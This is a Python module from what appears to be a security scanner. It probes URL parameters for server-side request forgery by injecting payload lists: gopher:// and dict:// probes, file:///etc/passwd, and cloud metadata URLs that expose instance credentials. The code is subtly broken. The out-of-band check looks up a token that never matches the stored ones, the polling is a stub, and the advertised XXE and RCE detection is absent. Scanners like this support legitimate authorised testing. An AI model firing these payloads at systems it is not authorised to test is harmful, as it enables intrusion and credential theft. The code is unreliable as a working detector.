"""
asmon/modules/oob_detection.py — Out-of-Band vulnerability detection.

Uses callback server abstraction for:
  - SSRF detection via DNS/HTTP callbacks
  - Blind XXE detection
  - Blind RCE detection
"""

import logging
import uuid
import time
from typing import Optional, List
from urllib.parse import urlparse

from asmon.modules.base import (
    BaseModule, ModuleRegistry, Finding, FindingSeverity, FindingConfidence, FindingType,
)
from asmon.modules.http_utils import SecurityHTTPClient, inject_payload, get_params_from_url

logger = logging.getLogger("asmon.modules.oob")


class CallbackServer:
    """Abstraction for OOB callback servers (Burp Collaborator, Interactsh, etc.)."""

    def __init__(self, base_url: str, api_key: Optional[str] = None):
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self._interactions: dict[str, list] = {}

    def generate_payload(self, identifier: str) -> str:
        """Generate unique callback URL."""
        token = f"{identifier}.{uuid.uuid4().hex[:8]}"
        self._interactions[token] = []
        return f"{self.base_url}/{token}"

    def generate_dns_payload(self, identifier: str) -> str:
        """Generate DNS callback domain."""
        token = f"{identifier}.{uuid.uuid4().hex[:8]}"
        self._interactions[token] = []
        # Extract domain from base_url
        domain = urlparse(self.base_url).netloc
        return f"{token}.{domain}"

    def poll_interactions(self, token: str, timeout: int = 10) -> List[dict]:
        """Poll for interactions (implement based on your callback server)."""
        # This is a stub - implement based on actual callback server API
        # For Interactsh: GET /api/interactions?token=xxx
        # For custom: implement your polling logic
        return self._interactions.get(token, [])

    def check_interaction(self, token: str) -> bool:
        """Check if any interaction occurred for token."""
        return len(self.poll_interactions(token)) > 0


# SSRF payloads with callback placeholders
SSRF_PAYLOADS = [
    "{CALLBACK_URL}",
    "http://{CALLBACK_URL}",
    "https://{CALLBACK_URL}",
    "//\\ {CALLBACK_URL}",
    "http://localhost:80@{CALLBACK_URL}",
    "http://127.0.0.1#{CALLBACK_URL}",
    "dict://{CALLBACK_DNS}:11211/stat",
    "gopher://{CALLBACK_DNS}:11211/_stats",
    "file:///etc/passwd",  # Local file for error-based detection
]

# Cloud metadata URLs for SSRF
CLOUD_METADATA = [
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/openstack/latest/meta_data.json",  # OpenStack
]


@ModuleRegistry.register
class OOBDetectionModule(BaseModule):
    """Detects vulnerabilities via Out-of-Band interactions."""

    name = "oob_detection"
    description = "Detects SSRF, blind XXE, blind RCE via OOB callbacks"
    risk_level = "medium"
    requires_authorization = True

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.http = SecurityHTTPClient(timeout=self.timeout, rate_limit=self.rate_limit, user_agent=self.user_agent)
        self.callback_server: Optional[CallbackServer] = None
        if self.callback_url:
            self.callback_server = CallbackServer(self.callback_url)
        self.poll_delay = 5  # Seconds to wait for callbacks

    def run(self, target: dict) -> list[Finding]:
        self.findings = []
        url = target.get("url")
        if not url:
            return self.findings

        params = get_params_from_url(url)

        # Test SSRF via cloud metadata (no callback needed)
        for param in params.keys():
            self._test_ssrf_metadata(url, param)

        # Test OOB if callback server configured
        if self.callback_server:
            for param in params.keys():
                self._test_oob_ssrf(url, param)

        return self.findings

    def _test_ssrf_metadata(self, url: str, param: str):
        """Test SSRF via cloud metadata endpoints."""
        for metadata_url in CLOUD_METADATA:
            test_url = inject_payload(url, param, metadata_url)
            result = self.http.get(test_url)

            if not result.success or not result.response:
                continue

            body = result.response.body_preview

            # Check for metadata signatures
            signatures = ["ami-id", "instance-id", "local-ipv4", "compute", "metadata"]
            for sig in signatures:
                if sig in body.lower():
                    self.add_finding(Finding(
                        finding_id=self.generate_finding_id("ssrf_cloud", url, param),
                        finding_type=FindingType.SSRF_CLOUD_METADATA.value,
                        module=self.name,
                        severity=FindingSeverity.CRITICAL.value,
                        confidence=FindingConfidence.CONFIRMED.value,
                        host=urlparse(url).netloc.split(":")[0],
                        url=url,
                        parameter=param,
                        title=f"SSRF - Cloud Metadata Access in parameter '{param}'",
                        description="Server can access cloud instance metadata. Critical for credential theft.",
                        evidence={"payload": metadata_url, "signature": sig, "parameter": param},
                        remediation="Block access to metadata IPs. Validate/allowlist URLs.",
                        cwe_ids=["CWE-918"],
                    ))
                    return

    def _test_oob_ssrf(self, url: str, param: str):
        """Test SSRF via OOB callbacks."""
        if not self.callback_server:
            return

        token = f"ssrf_{param}"
        callback_url = self.callback_server.generate_payload(token)
        callback_dns = self.callback_server.generate_dns_payload(token)

        for payload_template in SSRF_PAYLOADS[:5]:
            payload = payload_template.replace("{CALLBACK_URL}", callback_url)
            payload = payload.replace("{CALLBACK_DNS}", callback_dns)

            test_url = inject_payload(url, param, payload)
            self.http.get(test_url)

        # Wait and check for interactions
        time.sleep(self.poll_delay)

        if self.callback_server.check_interaction(token):
            self.add_finding(Finding(
                finding_id=self.generate_finding_id("ssrf_oob", url, param),
                finding_type=FindingType.SSRF_INTERNAL.value,
                module=self.name,
                severity=FindingSeverity.HIGH.value,
                confidence=FindingConfidence.CONFIRMED.value,
                host=urlparse(url).netloc.split(":")[0],
                url=url,
                parameter=param,
                title=f"SSRF detected via OOB callback in parameter '{param}'",
                description="Server made outbound request to attacker-controlled endpoint.",
                evidence={"callback_url": callback_url, "parameter": param},
                remediation="Validate/allowlist destination URLs. Block internal IPs.",
                cwe_ids=["CWE-918"],
            ))
